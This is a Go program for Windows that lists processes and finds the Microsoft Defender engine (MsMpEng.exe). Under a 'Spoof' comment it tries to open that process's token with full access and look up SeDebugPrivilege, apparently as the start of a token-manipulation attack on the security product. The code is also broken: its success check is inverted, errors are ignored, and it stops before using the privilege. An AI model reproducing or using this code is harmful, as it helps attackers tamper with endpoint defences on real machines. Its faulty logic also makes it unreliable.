package main

import (
	"bytes"
	"fmt"
	"golang.org/x/sys/windows"
	"strings"
	"syscall"
	"unsafe"
)

const (
	Th32cs_Snapprpcess = 0x00000002
	SE_DEBUG_NAME	= "SeDebugPrivilege"
)

type WindowsProcess struct {
	ProcessID       int
	ParentProcessID int
	Exe             string
}

type LUID struct {
	LowPart  uint32
	HighPart int32
}

type LUID_AND_ATTRIBUTES struct {
	Luid       LUID
	Attributes uint32
}

type TOKEN_PRIVILEGES struct {
	PrivilegeCount uint32
	Privileges     [1]LUID_AND_ATTRIBUTES
}

func newWindowsProcess(e *syscall.ProcessEntry32) WindowsProcess {
	// Find when the string ends for decoding
	end := 0
	for {
		if e.ExeFile[end] == 0 {
			break
		}
		end++
	}

	return WindowsProcess{
		ProcessID:       int(e.ProcessID),
		ParentProcessID: int(e.ParentProcessID),
		Exe:             syscall.UTF16ToString(e.ExeFile[:end]),
	}
}

func Processes() ([]WindowsProcess, error) {
	handle, err := syscall.CreateToolhelp32Snapshot(Th32cs_Snapprpcess, 0)
	if err != nil {
		return nil, err
	}
	defer syscall.CloseHandle(handle)

	var entry syscall.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))
	// get the first process
	err = syscall.Process32First(handle, &entry)
	if err != nil {
		return nil, err
	}

	results := make([]WindowsProcess, 0, 50)
	for {
		results = append(results, newWindowsProcess(&entry))

		err = syscall.Process32Next(handle, &entry)
		if err != nil {
			// windows sends ERROR_NO_MORE_FILES on last process
			if err == syscall.ERROR_NO_MORE_FILES {
				return results, nil
			}
			return nil, err
		}
	}
}

func FindProcessByName(processes []WindowsProcess, name string) *WindowsProcess {
	for _, p := range processes {
		if bytes.Contains([]byte(strings.ToUpper(p.Exe)),     []byte(strings.ToUpper(name))) {
			return &p
		}
	}
	return nil
}

func main() {
	parentName := "MsMpEng.exe"
	procS, _ := Processes()
	ParentInfo := FindProcessByName(procS, parentName) //找到指定进程的进程标识符PID
	if ParentInfo != nil {
		// found it
		fmt.Println("I got it!")
		//Spoof
		pid := uint32(ParentInfo.ProcessID)	//根据内存地址找到进程，并输出pid号
		fmt.Println(pid)
		const ProcessQueryInformation = windows.PROCESS_QUERY_LIMITED_INFORMATION
		pHandle, _ := syscall.OpenProcess(ProcessQueryInformation, false, pid)

		//fmt.Println(reflect.TypeOf(pHandle))
		//uintpHandle := uintptr(pHandle)
		var ptoken syscall.Token
		token :=syscall.OpenProcessToken(pHandle, syscall.TOKEN_ALL_ACCESS, &ptoken)
		if token !=nil{
			fmt.Println("[*] Opened Target Token Handle")
		} else {
			fmt.Println("[-] Failed to open Token Handle")
		}

		privStr, _ := syscall.UTF16PtrFromString(SE_DEBUG_NAME)
		luid := windows.LUID{}
		err := windows.LookupPrivilegeValue(nil,privStr,&luid)
		if err != nil {
			fmt.Println(err)
		}

	}
}